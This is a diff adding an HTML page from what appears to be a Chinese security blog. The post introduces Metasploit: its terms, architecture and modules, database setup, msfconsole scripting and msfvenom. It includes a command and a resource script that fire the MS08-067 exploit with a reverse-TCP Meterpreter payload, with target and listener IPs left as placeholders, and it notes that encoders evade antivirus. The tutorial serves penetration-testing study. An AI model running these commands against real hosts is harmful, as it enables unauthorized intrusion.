@@ -1,0 +1,79 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>metasploit基础 - Guko's Blog</title><meta name="description" content="0x01 metasploit简介目前流行、强大、具有扩展性的渗透测试框架，框架集成了渗透测试标砖（PETS）思想，一定程度上统一了渗透测试和漏洞研究的工作环境新的攻击代码可以很容易的经过二次开发后加入到框架中0x02 专业术语Exploit ：渗透攻击渗透攻击是我们去利用一个系统、应用或服务中的安"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">metasploit基础</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">metasploit基础</h1><div class="post-meta">2020-02-12<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><h3 id="0x01-metasploit简介"><a href="#0x01-metasploit简介" class="headerlink" title="0x01 metasploit简介"></a>0x01 metasploit简介</h3><p>目前流行、强大、具有扩展性的渗透测试框架，框架集成了渗透测试标砖（PETS）思想，一定程度上统一了渗透测试和漏洞研究的工作环境<br>新的攻击代码可以很容易的经过二次开发后加入到框架中</p>
+<a id="more"></a>
+<h3 id="0x02-专业术语"><a href="#0x02-专业术语" class="headerlink" title="0x02 专业术语"></a>0x02 专业术语</h3><p><code>Exploit</code> ：渗透攻击</p>
+<p>渗透攻击是我们去利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为</p>
+<p><code>Payload</code> : 攻击载荷</p>
+<p>攻击载荷是我们期望目标系统在被渗透攻击后去执行的代码，在metasploit框架中可以自由地选择、传送和植入。如，反弹式shell是一种<br>从目标主机到攻击主机创建网络连接，并提供windows命令行的shell的攻击载荷，而<code>bindshell</code>攻击载荷则在目标主机上将命令行shell绑定<br>到一个打开的监听端口，我们可以连接这些端口来获取交互式shell。除此之外还有直小执行一些简单命令的攻击载荷，如添加账户之类的</p>
+<p><code>Shellcode</code> ： shellcode是攻击时作为攻击载荷运行的一组机器指令，多数情况下，目标系统执行了shellcode这一组指令后，才会返回一个<br>命令行shell或者<code>meterpreter shell</code></p>
+<p><code>Module</code> ： 模块</p>
+<p>一个模块是指metasploit框架中所使用的一段软件代码组件，例如漏洞利用模块（exploit module）,做一些辅助工作的模块（auxiliary module）</p>
+<p><code>Listener</code> ： 监听器</p>
+<p>监听器是metasploit中用来等待连入网络连接的组件，例如在目标系统被我们打下来后，它可能会通过互联网回连到攻击主机上，监听器组件在攻击主机上<br>等待被渗透的主机来连接，负责处理这些网络连接</p>
+<h3 id="0x03-metasploit架构"><a href="#0x03-metasploit架构" class="headerlink" title="0x03 metasploit架构"></a>0x03 metasploit架构</h3><p>metasploit总体架构如下：</p>
+<p><img src="/2020/02/12/metasploit基础/3.jpg" alt></p>
+<p><code>TOOLS</code>: 集成了各种实用工具，多为收集的其他软件，如nmap等</p>
+<p><code>PLUGINS</code>：各种插件多数为收集的其他软件，直接调用API,连接和调用外部扩展功能和系统</p>
+<p><code>MODULES</code>: 功能技术模块</p>
+<p><code>MSF CORE</code>： 提供metasploit核心的API，是框架的核心能力实现库</p>
+<p><code>MSF BASE</code>： 提供友好的API接口，便于模块调用的库</p>
+<p><code>Rex LIBRARIES</code>： 基本功能库，用于完成日常基本任务，无需人工手动编码实现，处理socket链接访问、协议应答（http/SSL/SMB等）<br>编码转换（XOR、base64、Unicode）</p>
+<p><code>CLI</code>: 表示命令行界面</p>
+<p><code>GUI</code>: 表示图形化界面</p>
+<p><code>Console</code>： 控制台用户界面</p>
+<p><code>Web</code>： 网页，不再支持</p>
+<p><code>/usr/share/metasploit-framework/modules</code></p>
+<p>技术功能模块（非流程模块）</p>
+<p><code>Exploits</code>: 利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</p>
+<p><code>Payloads</code>： 攻击载荷，成功exploit之后，真正在目标系统执行的代码或指令</p>
+<p>shellcode或系命令</p>
+<p>三种payload: <code>/usr/share/metasploit-framework/modules/payloads/</code></p>
+<p>single : all-in-one</p>
+<p>stager: 目标计算机内存有限时，先传输一个较小的payload用于简历链接</p>
+<p>stages： 利用stager建立的链接下载的后续payload</p>
+<p>stager 、stagers 都有多种类型。适用于不同场景</p>
+<p>shellcode是payload的一种，用于建立正向/反向shell</p>
+<p><code>Auxiliary</code>: 执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有payload的exploit模块）</p>
+<p><code>Encoders</code>: 对payload进行加密，躲避AV检查的模块</p>
+<p><code>Nops</code>: 提高payload稳定性及维持大小</p>
+<h3 id="0x04-metasploit用户接口"><a href="#0x04-metasploit用户接口" class="headerlink" title="0x04 metasploit用户接口"></a>0x04 metasploit用户接口</h3><p>metasploit软件为其基础提供了多个用户接口，包括终端、命令行和图形化等等… </p>
+<h4 id="MSF终端"><a href="#MSF终端" class="headerlink" title="MSF终端"></a>MSF终端</h4><p>MSF终端是一站式接口，可以访问Metastploit框架中的几乎每一个选项和配置，我们用它可以做很多事，进行一次漏洞利用、装载辅助模块<br>扫描探测、创建监听器等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  启动msf终端</span><br><span class="line"></span><br><span class="line">help connect  查看帮助</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/12/metasploit基础/1.png" alt></p>
+<p>这里看到没有连接上数据库，需要做如下操作，使<code>PostgreSQL</code>数据库配置正常</p>
+<p>启动<code>PostgreSQL</code>数据库服务：<code>service postgresql start</code>监听<code>5432</code>端口</p>
+<p>初始化metasploit的数据库:<code>msfdb init</code></p>
+<p>查看数据库联接情况:<code>msfconsole db_status</code></p>
+<p>建立数据库缓存:<code>msfconsole db_rebuild_cache</code></p>
+<h4 id="msf命令行"><a href="#msf命令行" class="headerlink" title="msf命令行"></a>msf命令行</h4><p>在早期由于考虑到对脚本处理和与其命令行工具的相互操作性，metasploit提供了msfcli，msfcli可以直接从命令行shell执行，允许将其他工具<br>的输出重定向至msfcli中，或者将msfcli输出重定向给其他的命令行工具。后来把这种方法直接替换成了msf 终端的<code>-x</code>选项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfconsole -x &quot;use exploit/windows/ms08_067_netapi; set RHOST [ip]; set payload windows/meterpreter/reverse_tcp; set LHOST [ip]; run&quot;</span><br></pre></td></tr></table></figure>
+
+<p>msf终端还有资源脚本和命令化（alias）特性，可以先编写自动化的脚本/home/scripts/reverse_tcp.rc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/ms08_067_netapi</span><br><span class="line">set RHOST [ip]</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST [ip]</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>然后在msf终端上<code>-r</code>选项，执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfconsole -r /home/scripts/reverse_tcp.rc</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-metasploit功能程序"><a href="#0x05-metasploit功能程序" class="headerlink" title="0x05 metasploit功能程序"></a>0x05 metasploit功能程序</h3><p>metaploit的功能程序是在某些场合下,对metasploit框架中的一些特殊功能进行直接访问的接口，主要用在渗透代码的开发过程中</p>
+<h4 id="MSF攻击载荷生成器"><a href="#MSF攻击载荷生成器" class="headerlink" title="MSF攻击载荷生成器"></a>MSF攻击载荷生成器</h4><p>MSF攻击载荷生成器允许你能够生成shellcode、可执行代码，如需查看<code>msfvenom</code>这个功能需要什么配置选项，可以用<code>msfvenom -h</code>如下</p>
+<p><img src="/2020/02/12/metasploit基础/2.png" alt></p>
+<p>如果对某个攻击载荷模块不知道如何配置选项的时候，可以用<code>payload-options</code>可以列出所必须和可选的选项列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp --payload-options</span><br></pre></td></tr></table></figure>
+
+<h4 id="MSF编码器"><a href="#MSF编码器" class="headerlink" title="MSF编码器"></a>MSF编码器</h4><p>由MSF攻击载荷生成器产生的shellcode是可以运行的，不过其中包含了一些null空字符，在一些程序解析时，这些字符会被认为是字符串的结束<br>从而导致代码在完整执行之前被截断而终止运行<code>\x00</code>和<code>\xff</code>字符会破坏攻击载荷</p>
+<p>网络上明文传输的shellcode会被入侵检测系统（IDS）和杀毒软件识别，为了解决这类问题，metasploit提供了MSF编码器，用来对原始的<br>攻击载荷进行编码，来避免坏字符，逃避杀毒软件和IDS的检测</p>
+<p>参考链接</p>
+<p><a href="http://renyyy.hellotom.top/articles/906/" target="_blank" rel="noopener">http://renyyy.hellotom.top/articles/906/</a></p>
+<p><a href="https://xz.aliyun.com/t/3007" target="_blank" rel="noopener">https://xz.aliyun.com/t/3007</a></p>
+<p>metasploit渗透测试指南</p>
+<p>yuanfh</p>
+</div><!--文章标签--><div class="tags"><a href="/tags/metasploit/">metasploit</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 12px;">metasploit</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/远程代码执行/" style="font-size: 18px;">远程代码执行</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/02/12/metasploit基础/">metasploit基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/05/shell实现ping检测存活/">shell实现ping检测存活</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/14/DLL注入-DLL劫持DLL-the-backdoor-factory/">DLL注入&DLL劫持DLL&the-backdoor-factory</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/31/Apache之Solr-Velocity模板远程代码执行/">Apache之Solr-Velocity模板远程代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/21/CVE-2019-14287-sudo-权限绕过漏洞复现/">CVE-2019-14287- sudo-权限绕过漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/Joomla-3-4-6-RCE漏洞复现/">Joomla 3.4.6-RCE漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/phpstudy后门RCE复现/">phpstudy后门RCE复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/10/phpcms9-6-1任意文件下载poc编写/">phpcms9.6.1任意文件下载poc编写</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/07/CVE-2019-0708远程桌面代码执行漏洞复现/">CVE-2019-0708远程桌面代码执行漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/06/Cobalt-Strike基本使用/">Cobalt Strike基本使用</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
+  if($(".highlight").length != 0){
+    var pc_width = $(".post-content").width();
+    $(".highlight .code").find("pre").width((pc_width-70)+"px");
+  }
+}
+window.onresize = function(){
+  auto_code_fit();
+}
+auto_code_fit();</script></div></body>
